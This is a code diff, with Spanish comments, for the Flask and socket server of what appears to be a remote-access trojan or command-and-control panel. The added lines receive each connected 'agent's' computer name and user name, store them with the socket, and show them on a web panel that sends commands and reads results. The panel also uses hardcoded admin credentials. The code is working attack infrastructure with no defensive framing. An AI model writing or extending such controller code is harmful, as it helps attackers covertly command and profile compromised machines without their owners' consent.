@@ -6,7 +6,7 @@ from functools import wraps
 app = Flask(__name__)
 
 # --- CONFIGURACIÓN DE SEGURIDAD ---
-app.secret_key = 'clave_maestra_super_secreta_2026' # Cambia esto por lo que quieras
+app.secret_key = 'clave_maestra_super_secreta_2026' 
 USER_ADMIN = "admin"
 PASS_ADMIN = "pwned2026"
 
@@ -31,13 +31,26 @@ def escuchar_agentes():
     while True:
         try:
             conn, addr = server.accept()
+            
+            # --- NUEVO: RECIBIR IDENTIDAD DEL AGENTE ---
+            # El agente envía "PC-NAME|USER" justo después de conectar
+            identidad = conn.recv(1024).decode('cp850', errors='replace')
+            
+            if "|" in identidad:
+                pc_name, user_name = identidad.split("|")
+            else:
+                pc_name, user_name = "Desconocido", "Desconocido"
+
             id_agente = len(agentes)
             agentes[id_agente] = {
                 "socket": conn, 
                 "addr": addr, 
+                "pc": pc_name,      # Guardamos el nombre del PC
+                "user": user_name,  # Guardamos el usuario
                 "res": "Esperando comandos..."
             }
-            print(f"[+] NUEVO AGENTE CONECTADO: ID {id_agente} desde {addr[0]}")
+            print(f"[+] NUEVO AGENTE: {pc_name}\\{user_name} desde {addr[0]}")
+            
         except Exception as e:
             print(f"[-] Error en red: {e}")
 
@@ -93,15 +106,14 @@ def api_agentes():
         datos.append({
             "id": id_agente,
             "ip": info["addr"][0],
+            "pc": info.get("pc", "N/A"),     # Enviamos el PC a la web
+            "user": info.get("user", "N/A"), # Enviamos el Usuario a la web
             "resultado": info["res"]
         })
     return jsonify(datos)
 
 # --- BLOQUE DE ARRANQUE ---
 if __name__ == '__main__':
-    # Lanzar hilo de red
     threading.Thread(target=escuchar_agentes, daemon=True).start()
-    
-    # Iniciar Flask
     print("[*] Panel de Control Seguro activo en http://127.0.0.1:5000")
     app.run(host='0.0.0.0', port=5000, debug=False)
